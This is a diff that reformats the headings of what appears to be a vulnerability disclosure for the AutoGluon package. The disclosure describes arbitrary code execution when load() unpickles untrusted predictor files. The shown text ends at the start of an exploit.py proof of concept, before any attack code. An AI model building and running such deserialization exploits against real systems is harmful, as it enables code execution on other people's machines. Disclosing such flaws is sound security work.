@@ -1,20 +1,20 @@
-## :writing_hand: Description
+# Description
 
 `AutoGluon` automates machine learning tasks enabling you to easily achieve strong predictive performance in your applications. With just a few lines of code, you can train and deploy high-accuracy machine learning and deep learning models on text, image, and tabular data. This package is vulnerable to `Arbitrary Code Execution`.
 
-## :bug: Vulnerability
+# Vulnerability
 
 `load()` function is used to load predictor files by unpickling them. It should only unpickle trusted files generated with `save()` function.
 
-## :male_detective: Proof of Concept
+# Proof of Concept
 
-#### Installation
+# Installation
 ```bash
 pip install --upgrade "mxnet<2.0.0"
 pip install autogluon
 ```
 
-#### Run exploit.py
+# Run exploit.py
 ```python
 #!/usr/bin/env python3
 
